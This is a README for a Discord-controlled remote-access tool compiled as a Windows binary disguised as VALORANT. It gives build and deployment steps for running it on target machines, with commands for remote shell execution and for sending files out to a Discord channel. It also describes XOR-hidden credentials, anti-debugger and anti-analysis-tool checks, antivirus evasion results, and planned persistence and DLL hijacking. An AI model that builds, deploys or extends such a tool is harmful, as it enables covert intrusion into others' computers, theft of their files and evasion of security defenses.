# opss-terconnect

Discord bot C2. Python, Nuitka-compiled Windows binary. Remote command execution, file download, and host discovery from a Discord control channel.

## How it works

One binary per target machine. Each target runs its own Discord bot with its own token. The operator sends commands in a control channel; the bot on the matching machine executes them and sends results back.

```
Operator ── Discord ──▶ control channel
                            │
            ┌───────────────┼───────────────┐
            ▼               ▼               ▼
       [target A]      [target B]      [target C]
       bot token A     bot token B     bot token C
```

## Build

**One build per target. One token per target. Do not share binaries.**

```bash
# 1. Generate XOR-obfuscated config (on build machine, with real token)
python token_gen.py "MT...bot-token..." "channel_id" "admin_id"

# 2. Paste the output into VALORANT.py, replacing the placeholder lists

# 3. Compile
pip install -r requirements.txt
python -m nuitka --onefile --windows-console-mode=disable \
    --windows-icon-from-ico=valorant.ico VALORANT.py
```

The token, channel ID, and admin ID are XOR-obfuscated in the source — never in plaintext. The compiled binary does not reveal them via `strings` or static analysis.

## Deploy

Copy the `.exe` to the target machine. Run it. The bot connects to Discord, announces itself in the control channel, and waits for commands.

To stop: end the process in Task Manager.

## Commands

| Command | Description |
|---------|-------------|
| `!exec <name> <cmd>` | Run a shell command on the target matching `<name>` (hostname, uppercase) |
| `!download <name> <path>` | Upload a file from the target to the control channel (max 25 MB) |
| `!pingall` | Target responds with a presence check |

## Security

### Built-in

- **XOR-obfuscated credentials** — token, channel ID, admin ID as XOR byte arrays. No plaintext in source or binary. Defends against `strings` and static disassembly.
- **Anti-debug** — `IsDebuggerPresent` + `CheckRemoteDebuggerPresent` at startup. Silent exit if attached.
- **Anti-tool scan** — process list checked for ProcmDump, Process Hacker, x64dbg, Cheat Engine, WinDbg, IDA, dnSpy, and others. Silent exit if found.
- **Memory wiping** — decoded token held in a ctypes buffer, converted to string for discord.py, buffer then wiped. Reduces in-memory footprint.

### Limitations

- **Memory dump:** The token must be a string in memory for discord.py to connect. A dump taken while running finds it. XOR storage defends the binary on disk only.
- **XOR key in repo:** The key and obfuscated bytes are committed. A reverse engineer who decodes the logic recovers the values. This stops casual analysis, not a determined debugger.
- **Anti-debug bypassable:** Checks can be circumvented by renaming tools, patching the binary, or dumping externally.

## Case study

Tested against Defender and analysis:

| Method | Defender | Static analysis | Dynamic analysis | Verdict |
|--------|----------|----------------|------------------|---------|
| PyInstaller | Not flagged | Easy — token revealed | — | Failed |
| PyArmor | Flagged | Encrypted (good) | Token recovered | Failed |
| Nuitka | Not flagged | Failed | Token recovered | Best so far |

Nuitka is the current choice: AV-evasive, but dynamic analysis still recovers the token. The XOR-obfuscated config and anti-analysis defenses are effort to make that recovery harder.

## Cleanup

End the executable in Task Manager.

## Roadmap

1. Persistence
2. Custom token distribution server
3. Rotate final hash executable generation
4. DLL hijacking and hollowing

---

## Screenshots

**Connected**

![Connected](images/connected.png)

**Ping**

![Ping](images/ping.png)

**Command execution**

![Exec](images/exec.png)

**File download**

![Download](images/download.png)

**Bonus**

![Pwned](images/pwned.png)

> My friend sent me this after recovering the token from dynamic analysis on the PyArmor build.
